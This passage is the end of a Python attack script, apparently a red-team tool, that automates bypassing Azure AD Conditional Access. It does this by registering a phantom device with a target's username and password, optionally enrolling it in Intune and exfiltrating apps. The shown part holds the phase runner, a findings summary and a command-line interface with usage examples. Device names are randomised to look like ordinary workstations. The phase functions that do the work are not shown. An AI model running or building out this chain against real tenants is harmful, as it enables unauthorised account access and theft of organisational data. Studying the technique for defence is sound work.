        phases.append((8, phase_8_intune_enroll))
        phases.append((9, phase_9_compliance_and_apps))

    stop_phase = args.stop_phase or 99

    for phase_num, phase_fn in phases:
        if phase_num < args.start_phase:
            log.info(f"Skipping phase {phase_num}: {PHASE_NAMES[phase_num]}")
            continue
        if phase_num > stop_phase:
            log.info(f"Stopping at phase {stop_phase} as requested")
            break

        success = phase_fn(state, log, args.dry_run)

        if not success and not args.force:
            log.error(f"Phase {phase_num} failed. Use --force to continue despite failures.")
            break
        elif not success and args.force:
            log.warning(f"Phase {phase_num} failed but --force is set. Continuing...")

        if not args.dry_run and phase_num < len(phases):
            # Brief pause between phases to avoid rate limiting
            time.sleep(2)

    # Summary
    print(f"\n{'='*70}")
    print("  EXECUTION SUMMARY")
    print(f"{'='*70}")
    log.info(f"Working directory: {work_dir}")
    log.info(f"Log file: {log.log_file}")
    log.info(f"Total findings: {len(log.findings)}")

    by_severity = {}
    for f in log.findings:
        sev = f["severity"]
        by_severity[sev] = by_severity.get(sev, 0) + 1
    for sev in ["CRITICAL", "HIGH", "MEDIUM", "INFO"]:
        if sev in by_severity:
            marker = {"CRITICAL": "🔴", "HIGH": "🟠", "MEDIUM": "🟡", "INFO": "⚪"}[sev]
            print(f"  {marker} {sev}: {by_severity[sev]}")

    log.save_findings()

    print(f"\n  Artifacts in: {work_dir}")
    print(f"  Full log: {log.log_file}")
    print(f"  Findings: {log.findings_file}")
    if state.has_enumeration:
        print(f"  ROADrecon DB: {work_dir / state.roadrecon_db}")
    print()

    os.chdir(original_dir)


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def main():
    parser = argparse.ArgumentParser(
        description="Azure AD CA Bypass via Device Identity Abuse — Automated Chain",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Based on: Cyderes Howler Cell — "One Password, No Device, Full Tenant"
Tools:    ROADtools (roadtx, roadrecon) by Dirk-jan Mollema
MITRE:    T1098.005, T1078.004, T1550.001, T1556.007, T1087.004, T1530

Examples:
  # Full bypass chain (phases 1-7)
  %(prog)s -u user@target.com -p 'Pass' -d target.com

  # Include Intune enrollment + app exfil (phases 1-9)
  %(prog)s -u user@target.com -p 'Pass' -d target.com \\
      --intune --intune-host svc.manage.microsoft.com:443 --hybrid-domain corp.target.com

  # Start from phase 4 (already have device cert)
  %(prog)s -u user@target.com -p 'Pass' -d target.com --start-phase 4

  # Dry run — preview all commands
  %(prog)s -u user@target.com -p 'Pass' -d target.com --dry-run
        """,
    )

    creds = parser.add_argument_group("Target Credentials")
    creds.add_argument("-u", "--username", required=True, help="Target UPN (user@domain.com)")
    creds.add_argument("-p", "--password", required=True, help="Target password")
    creds.add_argument("-d", "--domain", required=True, help="Target domain")

    device = parser.add_argument_group("Device Configuration")
    device.add_argument("--device-name", default=None,
                        help="Phantom device name (default: auto-generated)")
    device.add_argument("--device-type", default="Windows",
                        help="Registered device OS type: Windows (default), "
                             "macOS, iOS, or Android. A non-Windows join probes "
                             "platform-scoped Conditional Access / Intune policy.")
    device.add_argument("--os-version", default=None,
                        help="Registered device OS version (roadtx default if unset)")

    intune_grp = parser.add_argument_group("Intune Enrollment (Phase 8-9)")
    intune_grp.add_argument("--intune", action="store_true",
                            help="Enable Intune enrollment phases")
    intune_grp.add_argument("--intune-host",
                            help="Intune service host (e.g., svc.manage.microsoft.com:443)")
    intune_grp.add_argument("--hybrid-domain",
                            help="On-prem domain for hybrid join bypass")

    execution = parser.add_argument_group("Execution Control")
    execution.add_argument("--start-phase", type=int, default=1, choices=range(1, 10),
                           help="Start from this phase (default: 1)")
    execution.add_argument("--stop-phase", type=int, default=None, choices=range(1, 10),
                           help="Stop after this phase")
    execution.add_argument("--force", action="store_true",
                           help="Continue chain even if a phase fails")
    execution.add_argument("--dry-run", action="store_true",
                           help="Show commands without executing")

    output = parser.add_argument_group("Output")
    output.add_argument("--output-dir", default=".",
                        help="Base output directory (default: current dir)")

    args = parser.parse_args()

    # Auto-generate device name if not specified
    if not args.device_name:
        import random
        prefixes = ["YOURPC", "DESKTOP", "LAPTOP", "WKS"]
        suffix = "".join(random.choices("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=5))
        args.device_name = f"{random.choice(prefixes)}-{suffix}"

    run_chain(args)


if __name__ == "__main__":
    main()
